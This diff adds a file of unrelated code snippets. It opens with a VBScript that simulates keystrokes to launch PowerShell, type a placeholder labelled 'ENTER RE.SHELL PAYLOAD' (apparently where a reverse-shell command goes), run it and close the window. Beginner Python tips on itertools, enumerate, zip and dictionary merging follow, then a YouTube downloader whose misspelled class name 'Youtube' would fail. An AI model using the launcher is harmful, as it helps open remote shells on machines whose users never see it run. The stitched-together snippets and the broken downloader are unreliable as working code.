@@ -1,0 +1,61 @@
+	PowerShell
+
+set x=createobject("wscript.shell")
+
+x.sendkeys "^" + "{ESC}"
+wscript.sleep 1000
+x.sendkeys "windows powershell"
+wscript.sleep 1000
+x.sendkeys "{ENTER}"
+wscript.sleep 2000
+x.sendkeys "ENTER RE.SHELL PAYLOAD" 
+wscript.sleep 1000
+x.sendkeys "{ENTER}"
+wscript.sleep 2000
+x.sendkeys "exit"
+wscript.sleep 500
+x.sendkeys "{ENTER}"
+------------------------------------------------------------------
+Itertools
+The itertools module provides a set of functions to work with iterators and is not widely known. Some of the functions in this module are chain, product, and permutations.
+
+import itertools 
+numbers = [1, 2, 3] 
+result = list(itertools.permutations(numbers)) 
+#output all the permutations 
+#[(1, 2, 3), (1, 3, 2), (2, 1, 3), (2, 3, 1), (3, 1, 2), (3, 2, 1)]
+---------------------------------
+Enumerate function
+The enumerate() function adds a counter to an iterable and returns it in a form of enumerate object. This function is useful when you want to iterate over a list and also keep track of the index.
+fruits = ['apple', 'banana', 'mango'] 
+for index, fruit in enumerate(fruits): 
+    print(index, fruit)
+#0 apple
+#1 banana
+#2 mango
+---------------------------------
+Zip function
+The zip() function aggregates elements from each of the iterables and returns an iterator of tuples. This function is useful when you want to iterate over two or more lists simultaneously.
+list1 = [1, 2, 3] 
+list2 = ['a', 'b', 'c'] 
+for x, y in zip(list1, list2):
+    print(x, y)
+#1 a
+#2 b
+#3 c
+---------------------------------
+Merge 2 dictionaries quickly
+We can quickly merge 2 dictionaries in python using the following piece of code.
+dictionary_one = {"a": 1, "b": 2}
+dictionary_two = {"c": 3, "d": 4}
+merged = {**dictionary_one, **dictionary_two}
+print(merged)  
+# {'a': 1, 'b': 2, 'c': 3, 'd': 4}
+---------------------------------
+Youtube Video Downloader
+from pytube import YouTube
+link = input("Enter a youtube video's URL") # i.e. https://youtu.be/dQw4w9WgXcQ
+yt = Youtube(link)
+yt.streams.first().download()
+print("downloaded", link)
+---------------------------------
